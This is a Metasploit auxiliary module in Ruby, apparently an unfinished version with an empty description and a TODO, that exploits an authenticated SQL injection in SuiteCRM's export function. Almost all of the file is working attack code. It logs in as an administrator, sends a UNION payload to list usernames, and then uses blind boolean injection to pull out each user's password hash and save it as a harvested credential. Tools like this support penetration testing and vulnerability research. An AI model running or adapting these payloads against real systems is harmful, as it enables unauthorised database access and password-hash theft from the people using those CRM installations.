##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Exploit::SQLi
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi::BooleanBasedBlindMixin

  require 'pry'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SuiteCRM authenticated SQL injection in export functionality',
        'Description' => %q{ },
        'Author' => [
          'Exodus Intelligence', # Advisory
          'jheysel-r7', # poc + msf module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://blog.exodusintel.com/2022/06/09/salesagility-suitecrm-export-request-sql-injection-vulnerability/']
        ],
        # TODO: - update actions
        #
        'Actions' => [
          ['Dump tables', { 'Description' => 'Dumps database tables' }]
        ],
        'DefaultAction' => 'Dump tables',
        'DisclosureDate' => '2022-07-27',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'Privileged' => true
      )
    )
    register_options [
      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3]),
      OptString.new('USERNAME', [true, 'Username of user with administrative rights', 'admin']),
      OptString.new('PASS', [true, 'Password for administrator', 'admin']),
    ]
  end

  def authenticate
    print_status("Authenticating as #{datastore['USERNAME']}")
    initial_req = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri, 'index.php'),
        'keep_cookies' => true,
        'vars_get' => {
          'module' => 'Users',
          'action' => 'Login'
        }
      }
    )

    return false unless initial_req && initial_req.code == 200

    login = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => normalize_uri(target_uri, 'index.php'),
        'keep_cookies' => true,
        'vars_post' => {
          'module' => 'Users',
          'action' => 'Authenticate',
          'return_module' => 'Users',
          'return_action' => 'Login',
          'user_name' => datastore['USERNAME'],
          'username_password' => datastore['PASS'],
          'Login' => 'Log In'
        }
      }
    )

    return false unless login && login.code == 302

    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri, 'index.php'),
        'keep_cookies' => true,
        'vars_get' => {
          'module' => 'Administration',
          'action' => 'index'
        }
      }
    )

    auth_succeeded?(res)
  end

  def auth_succeeded?(res)
    return false unless res

    if res.code == 200
      print_good("Authenticated as: #{datastore['USERNAME']}")
      if res.body.include?('Unauthorized access to administration.')
        print_warning("#{datastore['USERNAME']} does not have administrative rights! Exploit will fail.")
        @is_admin = false
      else
        print_good("#{datastore['USERNAME']} has administrative rights.")
        @is_admin = true
      end
      @authenticated = true
      true
    else
      print_error("Failed to authenticate as: #{datastore['USERNAME']}")
      false
    end
  end

  def request(uid)
    res = send_request_cgi({
      'method' => 'POST',
      'keep_cookies' => true,
      'uri' => normalize_uri(target_uri.path, 'index.php?entryPoint=export'),
      'encode_params' => false,
      'vars_post' => {
        'uid' => uid,
        'module' => 'Accounts',
        'action' => 'index'
      }
    })
    res
  end

  # A valid uid is required to successfully exploit to the blind boolean sqli
  # @return a string of the first UID returned by the server
  def get_uid
    # By sending a blank UID the server responds with the info for all users
    uid = request('').body.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/)[0]
    fail_with(Failure::NotFound, 'Unable to retrieve a uid from the server.') unless uid
    uid
  end

  # This method uses UNION based injection to collect the user names from the users
  # @return an array of usernames
  def get_user_names
    res = request('\\,))+UNION+select+*+from+users;+--+')
    users = []
    res.body.each_line do |user|
      username = user.match(/"([\w\s]+)",/)
      next if username[1] == 'Name'

      print_good("Found user: #{username[1]}")
      users << username[1]
    end
    users
  end

  # Use blind boolean SQL injection to determine the user_hashes of given usernames
  def get_user_hashes(users)
    hex_user_names = []
    hash_length = 60
    users.each do |user|
      hex_user_names << user.each_byte.map { |b| b.to_s(16) }.join.prepend('0x')
    end

    uid = get_uid
    postive_response_length = request(uid).body.length
    vprint_status("postive_response_length is #{postive_response_length}\n")
    charset = '$abcdefghijklmnopqrstuvwxyz0123456789.ABCDEFGHIJKLMNOPQRSTUVWXYZ_@-./'
    charset_bytes = charset.each_byte.map { |b| b.to_s(16) }
    columns = ['user_name', 'password_hash']
    table = Rex::Text::Table.new('Header' => 'SuiteCRM Users and Password Hashes', 'Indent' => 1, 'Columns' => columns)

    hex_user_names.each do |hex_user_name|
      x = 0
      hex_hash = ''
      while x < hash_length
        x += 1
        charset_bytes.each do |byte|
          payload = "#{uid},\\,))+AND+(select+(select+case+when+((select+user_hash+from+users+where+user_name=#{hex_user_name})+like+binary+0x#{hex_hash}#{byte}25)+then+1+else+2+end)=1);+--+"
          body_length = request(payload).body.length
          next unless body_length == postive_response_length

          hex_hash << byte
          print("Got char: 0x#{byte}. Hash for user #{[hex_user_name].pack('H*')} is now 0x#{hex_hash}\r")
          break
        end
      end
      hash = [hex_hash].pack('H*')
      print("\n")
      print_good("User #{[hex_user_name].pack('H*')} has user_hash: #{hash}")
      create_credential({
                          workspace_id: myworkspace_id,
                          origin_type: :service,
                          module_fullname: fullname,
                          username: [hex_user_name].pack('H*'),
                          private_type: :nonreplayable_hash,
                          jtr_format: identify_hash(hash),
                          private_data: hash,
                          service_name: 'SuiteCRM',
                          address: datastore['RHOSTS'],
                          port: datastore['RPORT'],
                          protocol: 'tcp',
                          status: Metasploit::Model::Login::Status::UNTRIED
                        })
      table << [[hex_user_name].pack('H*'),hash]
    end
    print(table.to_s )
  end

  def run_host(_ip)
    authenticate unless @authenticated
    fail_with Failure::NoAccess, 'Unable to authenticate to SuiteCRM' unless @authenticated
    users = get_user_names
    get_user_hashes(users)
  end
end
